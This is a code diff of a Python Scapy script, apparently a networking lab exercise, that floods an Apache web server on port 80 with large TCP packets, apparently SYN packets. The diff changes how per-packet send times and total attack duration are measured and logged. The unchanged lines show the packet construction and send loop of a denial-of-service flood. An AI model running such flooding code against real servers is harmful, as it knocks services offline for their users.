@@ -19,7 +19,6 @@ TARGET_PORT = 80 #The target port, the port of the apache http server were attac
 
 #Function to send the packets
 def attack():
-    start_time = time.time() #Get the start time of the attack
     index_time = np.zeros((INEER_LOOPS*OUTER_LOOPS,2)) #List to store the index and time of each packet sent
 
     index = 0
@@ -32,17 +31,17 @@ def attack():
             raw = Raw(b"X"*1024) #Add additional data to the packet, to make it bigger
 
             p = ip/tcp/raw #Constuct the packet, layer by layer
-
+            
+            before = time.time() #Get the time before sending the packet
             send(p, loop=0, verbose=0) #Send the packet in a loop, verbose=0 to suppress output
-            index_time[index] = [index, time.time()] #Store the index and the time the packet was sent, for later analysis
+            after = time.time()
+            index_time[index] = [index, (after-before)*1000] #Store the index and the time took to send in ms
             index += 1
             
             if (j + 1) % 1000 == 0:  # Print after every 1000 iterations
                 print(f"Sent {j + 1} packets in iteration {i + 1}")
                 
-    time_diff = np.diff(index_time[:, 1]) #Calculate the time difference between each packet sent, to know how long it took to send each packet
-    time_diff = np.insert(time_diff, 0, index_time[0, 1] - start_time)
-    return time_diff
+    return index_time
 
 
 
@@ -52,14 +51,18 @@ def attack():
         
 
 if __name__ == '__main__':
+    start = time.time() #Get the time before starting the attack
     index_time = attack() #Start the attack and get the time difference between each packet sent
-    avg_time_took = np.mean(index_time)#Calculate the average time it took to send a packet
-    print(f"The avg time took to send a packet: {avg_time_took}")
+    end = time.time() #Get the time after the attack has finished
+    sum = 0
     with open('./syns_result_p.txt', 'w') as file: #Write the index and time difference to a file as requested
         for i in range(len(index_time)):
             time_diff = index_time[i]
-            file.write(f"{i} {time_diff}\n") #Write the index and time difference to the file
-
+            sum += time_diff[1]
+            file.write(f"{i} {time_diff[1]}\n") #Write the index and time difference to the file
+    print(f"Attack took {(end - start)*1000} ms") #Print the time taken for the attack to finish
+    print(f"Attack took {sum} ms") #Print the time taken for the attack to finish
+    
 
 
 
